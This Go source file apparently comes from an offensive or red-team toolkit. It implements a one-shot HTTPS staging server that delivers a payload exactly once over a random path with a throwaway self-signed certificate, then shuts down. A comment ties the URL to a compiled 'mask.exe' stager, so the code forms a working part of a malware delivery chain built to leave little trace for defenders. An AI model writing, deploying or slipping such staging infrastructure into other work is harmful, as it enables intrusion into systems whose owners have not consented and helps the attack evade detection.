package stage

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"math/big"
	"net/http"
	"sync/atomic"
	"time"
)

// Server is a one-shot HTTPS payload server. It serves the payload exactly once
// then shuts itself down.
type Server struct {
	data   []byte
	port   int
	path   string
	served atomic.Bool
}

// NewServer creates a one-shot HTTPS server for the given payload.
// The random URL path is generated at creation time and is available via Path()
// before the server starts — call Path() before building mask.exe so the
// compiled-in URL and the server path match.
func NewServer(data []byte, port int) *Server {
	pathBytes := make([]byte, 8)
	rand.Read(pathBytes) //nolint:errcheck
	return &Server{
		data: data,
		port: port,
		path: "/" + hex.EncodeToString(pathBytes),
	}
}

// Path returns the random URL path this server will serve on.
func (s *Server) Path() string { return s.path }

// ListenAndServe starts the HTTPS server and blocks until the payload has been
// served once (or an error occurs). Prints the full URL before blocking.
func (s *Server) ListenAndServe() error {
	cert, err := selfSignedCert()
	if err != nil {
		return fmt.Errorf("generating cert: %w", err)
	}

	srv := &http.Server{
		Addr: fmt.Sprintf(":%d", s.port),
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		},
	}

	http.HandleFunc(s.path, func(w http.ResponseWriter, r *http.Request) {
		if !s.served.CompareAndSwap(false, true) {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(s.data) //nolint:errcheck

		go func() {
			time.Sleep(500 * time.Millisecond)
			srv.Shutdown(context.Background()) //nolint:errcheck
		}()
	})

	if err := srv.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
		return err
	}
	return nil
}

func selfSignedCert() (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "operator"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
	}
	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return tls.Certificate{}, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	return tls.X509KeyPair(certPEM, keyPEM)
}
